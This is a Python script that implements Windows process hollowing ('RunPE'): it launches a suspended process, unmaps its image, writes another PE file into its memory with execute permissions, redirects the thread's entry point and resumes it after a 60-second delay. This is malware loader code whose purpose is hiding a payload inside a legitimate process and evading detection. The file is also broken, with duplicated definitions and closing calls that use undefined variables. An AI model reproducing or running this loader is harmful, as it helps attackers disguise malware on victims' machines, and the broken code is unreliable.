import base64
import subprocess
import sys
import pefile
import ctypes
import os
import time
from cryptography.fernet import Fernet

BYTE = ctypes.c_ubyte
WORD = ctypes.c_ushort
DWORD = ctypes.c_uint32
LPSTR = ctypes.c_char_p
HANDLE = ctypes.c_void_p

CREATE_SUSPENDED = 0x0004
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

BYTE      = ctypes.c_ubyte
WORD      = ctypes.c_ushort
DWORD     = ctypes.c_uint32
LPSTR 	  = ctypes.c_char_p 
HANDLE    = ctypes.c_void_p

CREATE_SUSPENDED = 0x0004
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

class PROCESS_INFORMATION(ctypes.Structure):
	_fields_ = [
	('hProcess', HANDLE), 
	('hThread', HANDLE), 
	('dwProcessId', DWORD), 
	('dwThreadId', DWORD),
	]
	
class STARTUPINFO(ctypes.Structure):
	_fields_ = [
	('cb', DWORD), 
	('lpReserved', LPSTR),    
	('lpDesktop', LPSTR),
	('lpTitle', LPSTR),
	('dwX', DWORD),
	('dwY', DWORD),
	('dwXSize', DWORD),
	('dwYSize', DWORD),
	('dwXCountChars', DWORD),
	('dwYCountChars', DWORD),
	('dwFillAttribute', DWORD),
	('dwFlags', DWORD),
	('wShowWindow', WORD),
	('cbReserved2', WORD),
	('lpReserved2', DWORD),    
	('hStdInput', HANDLE),
	('hStdOutput', HANDLE),
	('hStdError', HANDLE),
	]

class FLOATING_SAVE_AREA(ctypes.Structure):
	_fields_ = [
	("ControlWord", DWORD),
    ("StatusWord", DWORD),
    ("TagWord", DWORD),
    ("ErrorOffset", DWORD),
    ("ErrorSelector", DWORD),
    ("DataOffset", DWORD),
    ("DataSelector", DWORD),
    ("RegisterArea", BYTE * 80),
    ("Cr0NpxState", DWORD),
	]	
	
class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", DWORD),
        ("Dr0", ctypes.c_uint64),  # changed from DWORD
        ("Dr1", ctypes.c_uint64),  # changed from DWORD
        ("Dr2", ctypes.c_uint64),  # changed from DWORD
        ("Dr3", ctypes.c_uint64),  # changed from DWORD
        ("Dr6", ctypes.c_uint64),  # changed from DWORD
        ("Dr7", ctypes.c_uint64),  # changed from DWORD
        ("FloatSave", FLOATING_SAVE_AREA),
        ("SegGs", ctypes.c_uint64),  # changed from DWORD
        ("SegFs", ctypes.c_uint64),  # changed from DWORD
        ("SegEs", ctypes.c_uint64),  # changed from DWORD
        ("SegDs", ctypes.c_uint64),  # changed from DWORD
        ("Rdi", ctypes.c_uint64),  # changed from DWORD
        ("Rsi", ctypes.c_uint64),  # changed from DWORD
        ("Rbx", ctypes.c_uint64),  # changed from DWORD
        ("Rdx", ctypes.c_uint64),  # changed from DWORD
        ("Rcx", ctypes.c_uint64),  # changed from DWORD
        ("Rax", ctypes.c_uint64),
        ("Rbp", ctypes.c_uint64),  # changed from DWORD
        ("Rip", ctypes.c_uint64),  # changed from DWORD
        ("SegCs", ctypes.c_uint64),  # changed from DWORD
        ("EFlags", DWORD),
        ("Rsp", ctypes.c_uint64),  # changed from DWORD
        ("SegSs", ctypes.c_uint64),  # changed from DWORD
        ("ExtendedRegisters", BYTE * 80),
    ]


def generate_key():
    key = Fernet.generate_key()
    cipher = Fernet(key)
    return cipher


def read_input_file(input_file):
    with open(input_file, 'rb') as f:
        data = f.read()
    return data


def create_string_buffer(decrypted_software, fd_size):
    buffer = ctypes.create_string_buffer(decrypted_software, fd_size)
    p = ctypes.addressof(buffer)
    return p


def create_suspended_process(filepath):
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()
    if ctypes.windll.kernel32.CreateProcessW(None, filepath, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
        print("[+] Process successfully launched")
        print("[+] PID : %d\n" % pi.dwProcessId)
    else:
        error_code = ctypes.windll.kernel32.GetLastError()
        raise RuntimeError(f"Failed to create new process. Error code: {error_code}")
    return si, pi


def unmap_view_of_section(pi, pefilepath):
    if ctypes.windll.ntdll.NtUnmapViewOfSection(pi.hProcess, LPSTR(pefilepath.OPTIONAL_HEADER.ImageBase)):
        print("[+] Unmap View Of Section Succeed")
    else:
        error_code = ctypes.windll.kernel32.GetLastError()
        raise RuntimeError(f"Failed to unmap the original exe. Error code: {error_code}")


def allocate_virtual_memory(pi, pe):
    if ctypes.windll.kernel32.VirtualAllocEx(pi.hProcess, ctypes.c_void_p(pe.OPTIONAL_HEADER.ImageBase), pe.OPTIONAL_HEADER.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE):
        print("[+] Virtual Alloc Succeed")
    else:
        error_code = ctypes.windll.kernel32.GetLastError()
        raise RuntimeError(f"Failed to allocate virtual memory. Error code: {error_code}")


def write_process_memory(pi, pe, p):
    if ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, LPSTR(pe.OPTIONAL_HEADER.ImageBase), ctypes.c_void_p(p), ctypes.c_int(pe.OPTIONAL_HEADER.SizeOfHeaders), None):
        print("[+] Write Process Memory Succeed")
        print("Error Code: ", ctypes.windll.kernel32.GetLastError())
    else:
        error_code = ctypes.windll.kernel32.GetLastError()
        raise RuntimeError(f"Failed to write to process memory. Error code: {error_code}")


def write_sections_to_memory(pi, pe, p):
    for section in pe.sections:
        if ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, LPSTR(pe.OPTIONAL_HEADER.ImageBase+section.VirtualAddress), ctypes.c_void_p(p+section.PointerToRawData), ctypes.c_int(section.SizeOfRawData), None):
            print("[+] Writing Section {} Succeed".format(section.Name.decode('utf-8')))
            print("    - Virtual Address: 0x{:X}".format(pe.OPTIONAL_HEADER.ImageBase + section.VirtualAddress))
            print("    - Raw Data Address: 0x{:X}".format(p + section.PointerToRawData))
            print("    - Section Size: {}".format(section.SizeOfRawData))
        else:
            error_code = ctypes.windll.kernel32.GetLastError()
            raise RuntimeError(f"Failed to write to process memory. Error code: {error_code}")


def get_thread_context(pi, cx):
    if ctypes.windll.kernel32.GetThreadContext(pi.hThread, ctypes.byref(cx)):
        print ("[+] Get Thread Context Succeed")
        rsp_value = cx.Rsp
        return rsp_value
    else:
        error_code = ctypes.windll.kernel32.GetLastError()
        raise RuntimeError(f"Failed to get thread context. Error Code: {error_code}")


def print_debug_info(pe, cx):
    print("[*] Image Base: 0x{:X}".format(pe.OPTIONAL_HEADER.ImageBase))
    print("[*] Entry Point: 0x{:X}".format(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
    print("[*] Old Rax: 0x{:X}".format(cx.Rax))


def set_new_context(cx, rsp_value, pe):
    cx.Rsp = rsp_value
    entry_point = pe.OPTIONAL_HEADER.ImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint
    cx.Rip = entry_point
    print("[*] New Rax: 0x{:X}".format(cx.Rax))


def set_thread_context(pi, cx):
    if ctypes.windll.kernel32.SetThreadContext(pi.hThread, ctypes.byref(cx)):
        print ("[+] Set Thread Context Succeed")
    else:
        error_code = ctypes.windll.kernel32.GetLastError()
        raise RuntimeError(f"Failed to set thread context. Error Code: {error_code}")


def sleep(time_to_sleep):
    print(f"Sleeping for {time_to_sleep} seconds")
    time.sleep(time_to_sleep)


def resume_thread(pi):
    if ctypes.windll.kernel32.ResumeThread(pi.hThread):
        print ("[+] Resume Thread Succeed")
        print ("\n[*] RunPE Succeed")
    else:
        error_code = ctypes.windll.kernel32.GetLastError()
        raise RuntimeError(f"Failed to resume thread. Error Code: {error_code}")



rsp_value = get_thread_context(pi, cx)
print_debug_info(pe, cx)
set_new_context(cx, rsp_value, pe)
set_thread_context(pi, cx)
sleep(60)
resume_thread(pi)

